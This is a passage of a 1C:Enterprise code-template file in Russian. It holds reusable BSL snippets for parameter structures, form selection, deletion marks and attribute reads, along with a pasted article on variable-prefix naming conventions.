	лПравоИмя 	= ""Администрирование"";
	Если ПравоДоступа(лИмяПрава, Метаданные, Роль) Тогда
		Сообщить(""'"" + Роль + ""' имеет право: "" + лПравоИмя);
	КонецЕсли;
	
КонецЦикла;"}
},
{0,
{"СтруктураПараметров",0,0,"СтруктПарам[етров]","лСтруктураПараметров<?""Дописать имя в конец (слитно)""> 	= Новый Структура();
лСтруктураПараметров<?""Дописать имя в конец (слитно)"">.Вставить(""Параметр""	, Неопределено);"}
},
{0,
{"СтруктураПараметров Функция",0,0,"СтруктПарамФ[ункция]","лПараметры<?""Имя параметров (Слитно)""> = СтруктураПараметров<?""Имя параметров (Слитно)"">();

Функция СтруктураПараметров<?""Имя параметров (Слитно)"">()
	
	лСтруктураПараметров<?""Имя параметров (Слитно)""> = Новый Структура;
	
	лСтруктураПараметров<?""Имя параметров (Слитно)"">.Вставить(""Параметр""	, Неопределено);
	
	Возврат лСтруктураПараметров<?""Имя параметров (Слитно)"">;
	
КонецФункции // СтруктураПараметров<?""Имя параметров (Слитно)"">()"}
},
{0,
{"СтруктураПараметров в переменную",0,0,"СтруктП[араметр]","<?""Имя параметра (слитно)""> 	= лСтруктураПараметров.<?""Имя параметра (слитно)"">;
<?>"}
},
{0,
{"СтруктураПараметров.Вставить",0,0,"СтруктПарамВ[ставить]","лСтруктураПараметров.Вставить(""<?""Имя параметра (слитно)"">""		, 	СтрокаТаблицы.<?""Имя параметра (слитно)"">);"}
},
{0,
{"РежимЗаписиДокумента",0,0,"РЗД","РежимЗаписиДокумента.Проведение"}
},
{0,
{"ПолучитьКомментарийКода",0,0,"","//Функция получает ""рабочий"" комментарий для вставки в код
//-------------------------------------------------------------------------
//Параметры:
//		ФИО 	- Строка или элемент справочника 	- Полное ФИО
//		ДокументНомер 	- Строка 	- Номер документа, если надо задать вручную
//		ДокументДата 	- Строка 	- Дата документа, если надо задать вручную
//		Префикс 	- Строка 	- Что будет после ""//+++ "", в целом краткое название фирмы
//Возвращаемое значение:
//		Строка 	- ""Рабочий"" комментарий 
//-------------------------------------------------------------------------
//автор: КучеровРМ 19.11.2018 
&НаКлиенте
Функция ПолучитьКомментарийКода(ФИО, ДокументНомер = """", ДокументДата = """", Префикс = ""АйТи"") Экспорт
	
	Если ЗначениеЗаполнено(ФИО) Тогда
		ИсполнительЗадачиФИО 	= ?(ТипЗнч(ФИО) <> Тип(""Строка""), Строка(ФИО), ФИО);
		
		ФИОФизическогоЛица 		= ФизическиеЛицаКлиентСервер.ЧастиИмени(СокрЛП(ИсполнительЗадачиФИО)); // разбиваем на части    
		ИсполнительЗадачи 		= ФизическиеЛицаКлиентСервер.ФамилияИнициалы(ФИОФизическогоЛица);
	Иначе
		ИсполнительЗадачи = """";
	КонецЕсли; 
	
	ФорматДаты 				= ""ДФ=dd.MM.yyyy"";
	
	ТекДата 				= Формат(ТекущаяДата(), ФорматДаты);
	
	ТипЗнчДокументДата = ТипЗнч(ДокументДата);
	Если ТипЗнчДокументДата <> Тип(""Строка"") Тогда
		ДокументДата = Формат(ДокументДата, ФорматДаты);
	КонецЕсли; 
	
	ТелоКомментария 	= ИсполнительЗадачи + "" "" + ТекДата + "" ТЗ № "" + ДокументНомер + ?(НЕ ПустаяСтрока(ДокументДата), "" от "" + ДокументДата, """");
	КомментарийКода 	= ""//+++ "" + Префикс + "" "" + ТелоКомментария + ""
	|	
	|//--- "" + Префикс + "" "" + ТелоКомментария;
	
	Возврат КомментарийКода;
	
КонецФункции // ПолучитьКомментарийКода()"}
},
{0,
{"Префиксы имен переменных в программных модулях",0,0,"","Предлагается система префиксов для именования переменных при написании программ на 1С. 
https://infostart.ru/public/99748/

Префиксы имен переменных в программных модулях

Правила именования переменных при разработке конфигураций на платформе 1С:Предприятие 7.7.

Префикс отделяется от основного имени переменной символом «_» для лучшей читаемости программы.
Гл_ - глобальная переменная, процедура или функция. Описана в глобальном модуле с ключевым словом ЭКСПОРТ.
м_ 	- переменная, описанная явно или неявно в текущем программном модуле. Рекомендуется всегда явно описывать переменные модуля в начале текста модуля с помощью оператора Перем.
л_ 	- переменная, описанная явно или неявно в текущей процедуре или функции. Рекомендуется никогда явно не описывать локальные переменные процедур и функций, а создавать их с помощью оператора присваивания, например: л_НомерСтроки=0.
п_ 	- параметр текущей процедуры или функции.
рд_ - реквизит диалога. Описан в форме диалога.
яч_ - ячейка таблицы в режиме ввода данных. Определена в таблице. Может использоваться в тексте программы в качестве переменных. Является первичной ячейкой и/или группой соседних ячеек, объединенных командой ""объединить ячейки"". Представляет собой единую неделимую единицу ввода и/или отображения информации в таблице.
от_ - область таблицы. Определена в таблице. Представляет собой группу ячеек таблицы. Используется, как правило, для форматирования ячеек области.
Отсутствие префикса означает, что переменная является реквизитом того объекта (справочника, документа, …), модулем которого является фрагмент программы. Как следствие, в модулях отчетов и обработок, в том числе и внешних, не должны встречаться переменные без префикса.

Правила именования переменных при разработке конфигураций на платформе 1С:Предприятие 8.

Гл_ 	- глобальная переменная, процедура или функция для основного режима работы конфигурации. Описана в модуле приложения с ключевым словом ЭКСПОРТ.
ГлВС_ 	- глобальная переменная, процедура или функция для работы конфигурации в режиме внешнего соединения. Описана в модуле внешнего соединения с ключевым словом ЭКСПОРТ.
м_ 		- (переменная модуля) переменная, описанная явно или неявно в текущем программном модуле. Рекомендуется всегда явно описывать переменные модуля в начале текста модуля с помощью оператора Перем.
л_ 		- переменная, описанная явно или неявно в текущей процедуре или функции. Рекомендуется никогда явно не описывать локальные переменные процедур и функций, а создавать их с помощью оператора присваивания, например: л_НомерСтроки=0. 
п_ 		- параметр текущей процедуры или функции.
рф_ 	- реквизит формы. Определен как реквизит формы (на закладке «Реквизиты»).
Отсутствие префикса означает, что переменная является реквизитом того объекта (справочника, документа, …), модулем которого является фрагмент программы. Как следствие, в модулях отчетов и обработок, в том числе и внешних, не должны встречаться переменные без префикса.

Комментарий.
Давно пользуюсь этой системой и уже не могу с ней расстаться.
Природа префиксов - ""по месту рождения"" переменной. Префикс отлично дополняет смысл, который можно узнать из имени переменной. Потому что всегда полезно знать, является переменная локальной или объявлена в модуле или это параметр процедуры (функции) или вообще является реквизитом объекта, к которому модуль относится. Когда писал на 7.7 до этой системы,был у меня случай (и потом еще пара случаев, когда другим помогал), когда объявлена переменная в модуле формы и с таким же именем реквизит диалога на форме. Первый раз очень трудно такую ошибку найти. 
При использовании префиксов такое просто невозможно.
Когда ко мне обращались за помощью в поиске ошибки и показывают модуль без префиксов, я часто говорю: ""префиксов нет, поэтому и не работает"". И на самом деле ошибка находится сама, стоит только расставить префиксы в модуле. Ну не все ошибки, конечно, а те, которые не позволяли двигаться дальше.

Для 8-ки практически все то же самое, что и для 7.7. Только в 8 реквизит диалога отделен от данных, поэтому префикса ""рд_"" нет. Обращение к элементам формы возможно только через свойство формы ""ЭлементыФормы"", так что префикс не нужен, и так ни с чем не спутаешь. Зато в форме могут быть реквизиты (которые определены на закладке формы ""реквизиты""). Для них префикс ""рф_"".
Еще пока не пришлось пользоваться префиксами ""Гл_"" и ""ГлВС_"" - для этого надо конфигурацию с нуля писать.

Хотел еще суффиксы ввести, ""Ссылка"" и ""Объект"". Но не прижились: писать долго, и хотя для смысла они очень полезны, но острой проблемы нет. Поэтому я их использую, но только в случаях, когда это необходимо, поэтому в систему для обязательного применения они не записаны. Но требуются они довольно часто, потому что все-таки важно понимать, переменная ""л_Контрагент"", например, является ""л_КонтрагентСсылка"" или ""л_КонтрагентОбъект"".

8-ка правда немного мешает применению этой системе. В 8-ке помощник ввода текстов гораздо мощнее, чем в 7.7. Например, при вставке предопределенных процедур модуля мы получаем заголовок процедуры вместе с параметрами, которые, к сожалению моему, без префиксов «п_». И ставить их мне иногда лень, Поэтому в текстах моих можно встретить небольшие процедуры без префиксов, если очень тороплюсь. Но в большинстве случаев все-таки меняю. И чем больше и сложнее текст процедуры, тем больше важно поставить префиксы у параметров.

Сейчас и разработчики 1С стали использовать префикс ""м"" в переменных модулей, правда без подчеркивания. На мой вкус с подчеркиванием лучше. Но все равно, когда читаешь текст какой-нибудь процедуры (функции) и сразу не понимаешь, локальная это переменная, параметр процедуры (функции) или реквизит объекта у меня возникает раздражение. Ну если уж пришли к префиксу ""м_"", то дальше просто просятся префиксы ""п_"" и ""л_"", с моей точки зрения, конечно."}
},
{0,
{"Префиксы имен переменных в программных модулях Дописан",0,0,"","Предлагается система префиксов для именования переменных при написании программ на 1С. 
https://infostart.ru/public/99748/

Префиксы имен переменных в программных модулях

Правила именования переменных при разработке конфигураций на платформе 1С:Предприятие 7.7.

Префикс отделяется от основного имени переменной символом «_» для лучшей читаемости программы.
Гл_ - глобальная переменная, процедура или функция. Описана в глобальном модуле с ключевым словом ЭКСПОРТ.
м_ 	- переменная, описанная явно или неявно в текущем программном модуле. Рекомендуется всегда явно описывать переменные модуля в начале текста модуля с помощью оператора Перем.
л_ 	- переменная, описанная явно или неявно в текущей процедуре или функции. Рекомендуется никогда явно не описывать локальные переменные процедур и функций, а создавать их с помощью оператора присваивания, например: л_НомерСтроки=0.
п_ 	- параметр текущей процедуры или функции.
рд_ - реквизит диалога. Описан в форме диалога.
яч_ - ячейка таблицы в режиме ввода данных. Определена в таблице. Может использоваться в тексте программы в качестве переменных. Является первичной ячейкой и/или группой соседних ячеек, объединенных командой ""объединить ячейки"". Представляет собой единую неделимую единицу ввода и/или отображения информации в таблице.
от_ - область таблицы. Определена в таблице. Представляет собой группу ячеек таблицы. Используется, как правило, для форматирования ячеек области.
Отсутствие префикса означает, что переменная является реквизитом того объекта (справочника, документа, …), модулем которого является фрагмент программы. Как следствие, в модулях отчетов и обработок, в том числе и внешних, не должны встречаться переменные без префикса.

Правила именования переменных при разработке конфигураций на платформе 1С:Предприятие 8.

Гл_ 	- глобальная переменная, процедура или функция для основного режима работы конфигурации. Описана в модуле приложения с ключевым словом ЭКСПОРТ.
ГлВС_ 	- глобальная переменная, процедура или функция для работы конфигурации в режиме внешнего соединения. Описана в модуле внешнего соединения с ключевым словом ЭКСПОРТ.
м_ 		- (переменная модуля) переменная, описанная явно или неявно в текущем программном модуле. Рекомендуется всегда явно описывать переменные модуля в начале текста модуля с помощью оператора Перем.
л_ 		- переменная, описанная явно или неявно в текущей процедуре или функции. Рекомендуется никогда явно не описывать локальные переменные процедур и функций, а создавать их с помощью оператора присваивания, например: л_НомерСтроки=0. 
п_ 		- параметр текущей процедуры или функции.
рф_ 	- реквизит формы. Определен как реквизит формы (на закладке «Реквизиты»).
Отсутствие префикса означает, что переменная является реквизитом того объекта (справочника, документа, …), модулем которого является фрагмент программы. Как следствие, в модулях отчетов и обработок, в том числе и внешних, не должны встречаться переменные без префикса.

Далее приписывается тип переменной сразу после первой, вида:
лс_ 	- Локальная Строка
лм_ 	- Массива
лМвт_ 	- МенеджерВременныхТаблиц
лСтр_ 	- Структура
лТз_ 	- ТаблицаЗначений
лРз_ 	- РезультатЗапроса

мм_ 	- Массив


Комментарий.
Давно пользуюсь этой системой и уже не могу с ней расстаться.
Природа префиксов - ""по месту рождения"" переменной. Префикс отлично дополняет смысл, который можно узнать из имени переменной. Потому что всегда полезно знать, является переменная локальной или объявлена в модуле или это параметр процедуры (функции) или вообще является реквизитом объекта, к которому модуль относится. Когда писал на 7.7 до этой системы,был у меня случай (и потом еще пара случаев, когда другим помогал), когда объявлена переменная в модуле формы и с таким же именем реквизит диалога на форме. Первый раз очень трудно такую ошибку найти. 
При использовании префиксов такое просто невозможно.
Когда ко мне обращались за помощью в поиске ошибки и показывают модуль без префиксов, я часто говорю: ""префиксов нет, поэтому и не работает"". И на самом деле ошибка находится сама, стоит только расставить префиксы в модуле. Ну не все ошибки, конечно, а те, которые не позволяли двигаться дальше.

Для 8-ки практически все то же самое, что и для 7.7. Только в 8 реквизит диалога отделен от данных, поэтому префикса ""рд_"" нет. Обращение к элементам формы возможно только через свойство формы ""ЭлементыФормы"", так что префикс не нужен, и так ни с чем не спутаешь. Зато в форме могут быть реквизиты (которые определены на закладке формы ""реквизиты""). Для них префикс ""рф_"".
Еще пока не пришлось пользоваться префиксами ""Гл_"" и ""ГлВС_"" - для этого надо конфигурацию с нуля писать.

Хотел еще суффиксы ввести, ""Ссылка"" и ""Объект"". Но не прижились: писать долго, и хотя для смысла они очень полезны, но острой проблемы нет. Поэтому я их использую, но только в случаях, когда это необходимо, поэтому в систему для обязательного применения они не записаны. Но требуются они довольно часто, потому что все-таки важно понимать, переменная ""л_Контрагент"", например, является ""л_КонтрагентСсылка"" или ""л_КонтрагентОбъект"".

8-ка правда немного мешает применению этой системе. В 8-ке помощник ввода текстов гораздо мощнее, чем в 7.7. Например, при вставке предопределенных процедур модуля мы получаем заголовок процедуры вместе с параметрами, которые, к сожалению моему, без префиксов «п_». И ставить их мне иногда лень, Поэтому в текстах моих можно встретить небольшие процедуры без префиксов, если очень тороплюсь. Но в большинстве случаев все-таки меняю. И чем больше и сложнее текст процедуры, тем больше важно поставить префиксы у параметров.

Сейчас и разработчики 1С стали использовать префикс ""м"" в переменных модулей, правда без подчеркивания. На мой вкус с подчеркиванием лучше. Но все равно, когда читаешь текст какой-нибудь процедуры (функции) и сразу не понимаешь, локальная это переменная, параметр процедуры (функции) или реквизит объекта у меня возникает раздражение. Ну если уж пришли к префиксу ""м_"", то дальше просто просятся префиксы ""п_"" и ""л_"", с моей точки зрения, конечно."}
},
{0,
{"Форма подбора",0,0,"","
////////////////////////////////////////////////////////////////////////////////
// ФормаДокумента 

&НаКлиенте
Процедура РезультатПодбор(Команда)
	
	ОписаниеОбработчикаВыбора = Новый ОписаниеОповещения(""ОбработкаПодбора"", ЭтотОбъект);
	//ПараметрыПодбора = Новый Структура(""ВидимостьФинансовойЦели,ВидимостьКоличестваИЦены,ДатаОтбора,ВалютаКошелька,ДатаОперации,КошелекОперации,СтрокаПоиска"",
	//ВидимостьФинансовойЦели, ВидимостьКоличестваИЦены, , ВалютаКошелька, Объект.Дата, Объект.КошелекДолг, """");
	ПараметрыПодбора = Неопределено;
	ОткрытьФорму(""Обработка.ФормыПодборов.Форма.ПодборРезультата"", ПараметрыПодбора, ЭтаФорма, Объект.Ссылка, ,, ОписаниеОбработчикаВыбора); 
	
КонецПроцедуры

&НаКлиенте
Процедура ОбработкаПодбора(РезультатПодбора, ДополнительныеПараметры) Экспорт

	Если НЕ ТипЗнч(РезультатПодбора) = Тип(""Структура"")
		ИЛИ НЕ РезультатПодбора.Свойство(""АдресТаблицыВыбора"") Тогда
		Возврат;
	КонецЕсли; 
	
	ДобавитьВРезультатСтрокиНаСервере(РезультатПодбора);

КонецПроцедуры

&НаСервере
Процедура ДобавитьВРезультатСтрокиНаСервере(РезультатПодбора)

	ТаблицаПодбора = ПолучитьИзВременногоХранилища(РезультатПодбора.АдресТаблицыВыбора);
	Для Каждого СтрокаПодбора Из ТаблицаПодбора Цикл
		Если ЗначениеЗаполнено(СтрокаПодбора.ИмяРезультата) Тогда
			СтрокаРасхода 				= Объект.Результат.Добавить();
			СтрокаРасхода.ИмяРезультата = СтрокаПодбора.ИмяРезультата;
			СтрокаРасхода.Параметр      = СтрокаПодбора.Параметр;
			СтрокаРасхода.Значение   	= СтрокаПодбора.Значение;
		КонецЕсли; 
	КонецЦикла; 

КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// ФормаПодбора 

&НаКлиенте
Процедура ПеренестиВЗапись(Команда)
	
	Закрыть(ПодготовитьРезультатКПереносуВЗапись(ВладелецФормы.УникальныйИдентификатор));
	
КонецПроцедуры

&НаСервере
Функция ПодготовитьРезультатКПереносуВЗапись(ИДВладельца)

	АдресТаблицы = ПоместитьВоВременноеХранилище(Результаты.Выгрузить(), ИДВладельца);
	Результат = Новый Структура(""АдресТаблицыВыбора"", АдресТаблицы);
	
	Возврат Результат;

КонецФункции


&НаКлиенте
Процедура СписокИсторииВыбор(Элемент, ВыбраннаяСтрока, Поле, СтандартнаяОбработка)
	
	СтандартнаяОбработка = Ложь;
	
	ВыборСтрокиСпискаИстории();
	
КонецПроцедуры

Процедура ДобавитьРезультатВСписок(СтруктураВыбора)

	НоваяСтрока 				= Результаты.Добавить();
	НоваяСтрока.ИмяРезультата 	= СтруктураВыбора.ИмяРезультата;
	НоваяСтрока.Параметр        = СтруктураВыбора.Параметр;
	НоваяСтрока.Значение        = СтруктураВыбора.Значение;
	
	Элементы.ФормаПеренестиВЗапись.Доступность = Результаты.Количество() > 0;

КонецПроцедуры

&НаКлиенте
Процедура ВыборСтрокиСпискаИстории()

	ТекущаяСтрока = Элементы.СписокИстории.ТекущиеДанные;
	Если ТекущаяСтрока = Неопределено Тогда
		Возврат;
	КонецЕсли; 
	
	ПараметрВыбора = Новый Структура(""ИмяРезультата, Параметр, Значение"", 
		ТекущаяСтрока.ИмяРезультата, ТекущаяСтрока.Параметр, ТекущаяСтрока.Значение);
	
	ДобавитьРезультатВСписок(ПараметрВыбора);

КонецПроцедуры

"}
},
{0,
{"ПолучитСсылкуНового",0,0,"","&НаСервереБезКонтекста
Функция <?""Имя элемента (слитно)"">ПолучитСсылкуНового()
	
	КлючУникальности 	= Новый УникальныйИдентификатор;
	НоваяСсылка 		= Документы.<?""Имя элемента (слитно)"">.ПолучитьСсылку(КлючУникальности);
	
	Возврат НоваяСсылка;
	
КонецФункции // <?""Имя элемента (слитно)"">ПолучитСсылкуНового()"}
},
{0,
{"Получучить область макета и вывести ее в табличный документ",0,0,"","ОбластьМакета<?""Имя области (слитно)""> 	= Макет.ПолучитьОбласть(""<?""Имя области (слитно)"">"");
ТабличныйДокумент.Вывести(ОбластьМакета<?""Имя области (слитно)"">);"}
},
{0,
{"Получить текст файла картинки",0,0,"","//Получить текст файла картинки? Хочу записать его в xml, чтобы вся инфа была в xml
//Вот кусок кода как в base64 вывести без внешних файлов (очень удобно для импорта любой программой) 
ВыбранноеИзображение 						= Новый Картинка(ИмяВременногоФайла, Ложь);
ЭлементыФормы.ПолеКартинки1.Картинка 		= ВыбранноеИзображение;
ЭлементыФормы.ПолеКартинки1.Масштабировать 	= Истина;
ЭлементыФормы.Надпись1.Значение 			= Строка(Выборка.ФизЛицо);
ЗаписьXML.ЗаписатьАтрибут(""img"", Base64Строка(Картинка.ПолучитьДвоичныеДанные()));"}
},
{0,
{"Контакты (КИ). Заполнение на форме типовое",0,0,"","Если Объект.АйТи_ПотреблениеПоСделке Тогда
	ДополнительныеПараметрыКИ = УправлениеКонтактнойИнформацией.ПараметрыКонтактнойИнформацией();
	ДополнительныеПараметрыКИ.Вставить(""ИмяЭлементаДляРазмещения"", ""ГруппаКонтактнаяИнформация"");
	ДополнительныеПараметрыКИ.Вставить(""ПоложениеЗаголовкаКИ"", ПоложениеЗаголовкаЭлементаФормы.Лево);
	ДополнительныеПараметрыКИ.Вставить(""ОтложеннаяИнициализация"", Истина);
	УправлениеКонтактнойИнформацией.ПриСозданииНаСервере(ЭтаФорма, Объект.АйТи_КонтактноеЛицо, ДополнительныеПараметрыКИ);
КонецЕсли;"}
},
{0,
{"ЗЗ (ЗначениеЗаполнено) с учетом мутабельных",0,0,"","// Определяет заполнено ли переданное значение
//
// Параметры: 
//  Значение - Неопределено - Значение, заполнение которого надо проверить
//
// Возвращаемое значение:
//  Булево - Истина, если значение заполнено, иначе ложь.
//
Функция обЗначениеЗаполнено(Значение) Экспорт

	Результат = Ложь;
	
	Попытка
		Результат = ЗначениеЗаполнено(Значение)	
	Исключение // Мутабельные типы (Объекты)
		Результат = Ложь
	КонецПопытки;
	
	Возврат Результат;
	
КонецФункции // обЗначениеЗаполнено()"}
},
{0,
{"РежимЗаписиДокумента.Проведение (РЗД)",0,0,"РЗД","РежимЗаписиДокумента.Проведение"}
},
{0,
{"Список.Отбор ",0,0,"","ГруппаОтбора 			= Список.Отбор.Элементы.Добавить(Тип(""ГруппаЭлементовОтбораКомпоновкиДанных""));
ГруппаОтбора.ТипГруппы 	= ТипГруппыЭлементовОтбораКомпоновкиДанных.ГруппаИЛИ;

ЭлементОтбора 					= Список.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
ЭлементОтбора.Родитель 			= ГруппаОтбора;
ЭлементОтбора.ЛевоеЗначение 	= Новый ПолеКомпоновкиДанных(""Объект"");
ЭлементОтбора.ВидСравнения 		= ВидСравненияКомпоновкиДанных.Равно;
ЭлементОтбора.Использование 	= Истина;
ЭлементОтбора.ПравоеЗначение 	= Объект.Ссылка;"}
},
{0,
{"ПолучитьРодителя (справочник)",0,0,"","Функция ПолучитьРодителя(пСправочникСсылка)
	
	лСправочникСсылка 	= пСправочникСсылка;
	Пока НЕ лСправочникСсылка.Родитель.Пустая() Цикл
		лСправочникСсылка 	= лСправочникСсылка.Родитель;	
	КонецЦикла;
	
	Возврат лСправочникСсылка;
	
КонецФункции
"}
},
{0,
{"ПометкаУдаления",0,0,"","&НаКлиенте
Процедура АйТи_УстановитьСнятьПометкуУдаленияПосле(Команда)
	
	УстановитьСнятьПометкуУдаления(Объект.СтатьяБазыЗнаний) 
	
КонецПроцедуры

&НаКлиенте
Процедура УстановитьСнятьПометкуУдаления(пСсылка, пЗначение = Неопределено)
	
	Если ЗначениеЗаполнено(пСсылка) Тогда
		Если пЗначение = Неопределено Тогда
			лОбъектПометкаУдаления 	= ПолучитьПометкуУдаленияНаСервере(пСсылка);
			лВопросСостояние 		= ?(НЕ лОбъектПометкаУдаления, ""Установить"", ""Снять"");
			Если Вопрос(лВопросСостояние + "" пометку на удаление?"", РежимДиалогаВопрос.ДаНет) = КодВозвратаДиалога.Да Тогда
				УстановитьСнятьПометкуУдаленияНаСервере(пСсылка);
			КонецЕсли; 
		Иначе
			УстановитьСнятьПометкуУдаленияНаСервере(пСсылка, пЗначение);
		КонецЕсли; 
	КонецЕсли;
	
КонецПроцедуры // УстановитьСнятьПометкуУдаления()

&НаСервереБезКонтекста
Функция ПолучитьПометкуУдаленияНаСервере(пСсылка)
	
	Возврат пСсылка.ПометкаУдаления;
	
КонецФункции // ПолучитьПометкуУдаленияНаСервере()

&НаСервереБезКонтекста
Процедура УстановитьСнятьПометкуУдаленияНаСервере(пСсылка, пЗначение = Неопределено)
	
	лОбъект 	= пСсылка.ПолучитьОбъект();
	Если пЗначение = Неопределено Тогда
		лОбъект.УстановитьПометкуУдаления(НЕ лОбъект.ПометкаУдаления);
	Иначе
		лОбъект.УстановитьПометкуУдаления(пЗначение);
	КонецЕсли; 
	
КонецПроцедуры // УстановитьСнятьПометкуУдаленияНаСервере()"}
},
{0,
{"Чтение отдельных реквизитов объекта из базы данных (ЗначенияРеквизитовОбъекта)",0,0,"","Чтение отдельных реквизитов объекта из базы данных
Область применения: управляемое приложение, мобильное приложение, обычное приложение.

При чтении отдельных реквизитов объекта из базы данных следует иметь в виду, что вызов метода ПолучитьОбъект или обращение к реквизитам объекта через точку от ссылки приводит к загрузке объекта из базы целиком, вместе с его табличными частями.

Поэтому для чтения значений отдельных реквизитов из базы данных следует использовать запрос. Например, неправильно:

Процедура ЗаполнитьКодИНаименованиеСтраны()
 
 СтранаСсылка = … // получаем ссылку на элемент справочника 
 КодСтраны = СтранаСсылка.Код; // первое обращение загружает объект целиком
 НаименованиеСтраны = СтранаСсылка.Наименование;
 
КонецПроцедуры

правильно:

Процедура ЗаполнитьКодИНаименованиеСтраны()
 
 Запрос = Новый Запрос(
  ""ВЫБРАТЬ
  | СтраныМира.Код,
  | СтраныМира.Наименование
  |ИЗ
  | Справочник.СтраныМира КАК СтраныМира
  |ГДЕ
  | СтраныМира.Ссылка = &Ссылка"");
 Запрос.УстановитьПараметр(""Ссылка"", Ссылка);
 
 Выборка = Запрос.Выполнить().Выбрать();
 Выборка.Следующий();

 КодСтраны = Выборка.Код;
 НаименованиеСтраны = Выборка.Наименование;

КонецПроцедуры

Для упрощения синтаксиса рекомендуется также использовать специальные функции ЗначенияРеквизитовОбъекта или ЗначениеРеквизитаОбъекта (входят в состав Библиотеки стандартных подсистем).
В этом случае исходный пример будет выглядеть так:

Процедура ЗаполнитьКодИНаименованиеСтраны()

 ЗначенияРеквизитов = ОбщегоНазначения.ЗначенияРеквизитовОбъекта(СтранаСсылка, ""Код, Наименование"");
 КодСтраны = ЗначенияРеквизитов.Код;
 НаименованиеСтраны = ЗначенияРеквизитов.Наименование;
 
КонецПроцедуры"}
},
{0,
{"ОбщегоНазначения.ЗначенияРеквизитовОбъекта(СтранаСсылка, ""Код, Наименование"");",0,0,"ЗРО","ОбщегоНазначения.ЗначенияРеквизитовОбъекта(лСсылка, ""<?>"");"}
},
{0,
{"ОбщегоНазначения.ЗначенияРеквизитовОбъекта(СтранаСсылка, ""Код, Наименование""); описание",0,0,"","// Структура, содержащая значения реквизитов, прочитанные из информационной базы по ссылке на объект.
//
// Если необходимо зачитать реквизит независимо от прав текущего пользователя,
// то следует использовать предварительный переход в привилегированный режим.
//
// Параметры:
//  Ссылка    - ЛюбаяСсылка - объект, значения реквизитов которого необходимо получить.
//            - Строка      - полное имя предопределенного элемента, значения реквизитов которого необходимо получить.
//  Реквизиты - Строка - имена реквизитов, перечисленные через запятую, в формате
//                       требований к свойствам структуры.
//                       Например, ""Код, Наименование, Родитель"".
//            - Структура, ФиксированнаяСтруктура - в качестве ключа передается
//                       псевдоним поля для возвращаемой структуры с результатом, а в качестве
//                       значения (опционально) фактическое имя поля в таблице.
//                       Если ключ задан, а значение не определено, то имя поля берется из ключа.
//            - Массив, ФиксированныйМассив - имена реквизитов в формате требований
//                       к свойствам структуры.
//  ВыбратьРазрешенные - Булево - если Истина, то запрос к объекту выполняется с учетом прав пользователя, и в случае,
//                                    - если есть ограничение на уровне записей, то все реквизиты вернутся 
//                                      со значением Неопределено;
//                                    - если нет прав для работы с таблицей, то возникнет исключение.
//                              - если Ложь, то возникнет исключение при отсутствии прав на таблицу 
//                                или любой из реквизитов.
//
// Возвращаемое значение:
//  Структура - содержит имена (ключи) и значения затребованных реквизитов.
//            - если в параметр Реквизиты передана пустая строка, то возвращается пустая структура.
//            - если в параметр Ссылка передана пустая ссылка, то возвращается структура, 
//              соответствующая именам реквизитов со значениями Неопределено.
//            - если в параметр Ссылка передана ссылка несуществующего объекта (битая ссылка), 
//              то все реквизиты вернутся со значением Неопределено.
//
Функция ЗначенияРеквизитовОбъекта(Ссылка, Знач Реквизиты, ВыбратьРазрешенные = Ложь) Экспорт
	
	// Если передано имя предопределенного. 
	Если ТипЗнч(Ссылка) = Тип(""Строка"") Тогда 
		
		ПолноеИмяПредопределенногоЭлемента = Ссылка;
		
		// Вычисление ссылки по имени предопределенного.
		// - дополнительно выполняет проверку метаданных предопределенного, выполняется предварительно.
		Попытка
			Ссылка = ОбщегоНазначенияКлиентСервер.ПредопределенныйЭлемент(ПолноеИмяПредопределенногоЭлемента);
		Исключение
			ТекстОшибки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Неверный первый параметр Ссылка:
			           |%1'""), КраткоеПредставлениеОшибки(ИнформацияОбОшибке()));
			ВызватьИсключение ТекстОшибки;
		КонецПопытки;
		
		// Разбор полного имени предопределенного.
		ЧастиПолногоИмени = СтрРазделить(ПолноеИмяПредопределенногоЭлемента, ""."");
		ПолноеИмяОбъектаМетаданных = ЧастиПолногоИмени[0] + ""."" + ЧастиПолногоИмени[1];
		
		// Если предопределенный не создан в ИБ, то требуется выполнить проверку доступа к объекту.
		// В других сценариях проверка доступа выполняется в момент исполнения запроса.
		Если Ссылка = Неопределено Тогда 
			
			МетаданныеОбъекта = Метаданные.НайтиПоПолномуИмени(ПолноеИмяОбъектаМетаданных);
			
			Если Не ПравоДоступа(""Чтение"", МетаданныеОбъекта) Тогда 
				ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
						НСтр(""ru = 'Недостаточно прав для работы с таблицей """"%1""""'""), ПолноеИмяОбъектаМетаданных);
			КонецЕсли;
			
		КонецЕсли;
		
	Иначе // Если передана ссылка.
		
		Попытка
			ПолноеИмяОбъектаМетаданных = Ссылка.Метаданные().ПолноеИмя(); 
		Исключение
			ВызватьИсключение НСтр(""ru = 'Неверный первый параметр Ссылка: 
			                             |- Значение должно быть ссылкой или именем предопределенного элемента'"");	
		КонецПопытки;
		
	КонецЕсли;
	
	// Разбор реквизитов, если второй параметр Строка.
	Если ТипЗнч(Реквизиты) = Тип(""Строка"") Тогда
		Если ПустаяСтрока(Реквизиты) Тогда
			Возврат Новый Структура;
		КонецЕсли;
		
		// Удаление пробелов.
		Реквизиты = СтрЗаменить(Реквизиты, "" "", """");
		// Преобразование параметра в массив полей.
		Реквизиты = СтрРазделить(Реквизиты, "","");
	КонецЕсли;
	
	// Приведение реквизитов к единому формату.
	СтруктураПолей = Новый Структура;
	Если ТипЗнч(Реквизиты) = Тип(""Структура"")
		Или ТипЗнч(Реквизиты) = Тип(""ФиксированнаяСтруктура"") Тогда
		
		СтруктураПолей = Реквизиты;
		
	ИначеЕсли ТипЗнч(Реквизиты) = Тип(""Массив"")
		Или ТипЗнч(Реквизиты) = Тип(""ФиксированныйМассив"") Тогда
		
		Для Каждого Реквизит Из Реквизиты Цикл
			
			Попытка
				ПсевдонимПоля = СтрЗаменить(Реквизит, ""."", """");
				СтруктураПолей.Вставить(ПсевдонимПоля, Реквизит);
			Исключение 
				// Если псевдоним не является ключом.
				
				// Поиск ошибки доступности полей.
				Результат = НайтиОшибкуДоступностиРеквизитовОбъекта(ПолноеИмяОбъектаМетаданных, Реквизиты);
				Если Результат.Ошибка Тогда 
					ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
						НСтр(""ru = 'Неверный второй параметр Реквизиты: %1'""), Результат.ОписаниеОшибки);
				КонецЕсли;
				
